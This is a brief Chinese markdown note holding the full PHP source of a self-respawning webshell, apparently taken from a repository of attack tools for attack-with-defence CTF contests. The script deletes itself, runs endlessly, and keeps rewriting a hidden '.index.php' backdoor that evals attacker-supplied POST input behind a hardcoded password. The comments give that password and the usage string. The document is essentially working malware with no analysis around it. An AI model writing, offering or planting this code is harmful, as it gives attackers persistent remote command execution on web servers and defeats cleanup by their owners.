# 不死马

```php
<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = './.index.php';
$code = '<?php if(md5($_POST["pass"])=="3a50065e1709acc47ba0c9238294364f"){@eval($_POST[a]);} ?>';
//pass=Sn3rtf4ck 马儿用法：fuckyou.php?pass=Sn3rtf4ck&a=command
while (1){
	file_put_contents($file,$code);
	usleep(5000);
}
?>
```

`.index.php` 是要循环写入的目标文件  

来源：https://github.com/admintony/Prepare-for-AWD/blob/master/Attack/不死马.php  


2020/6/12  
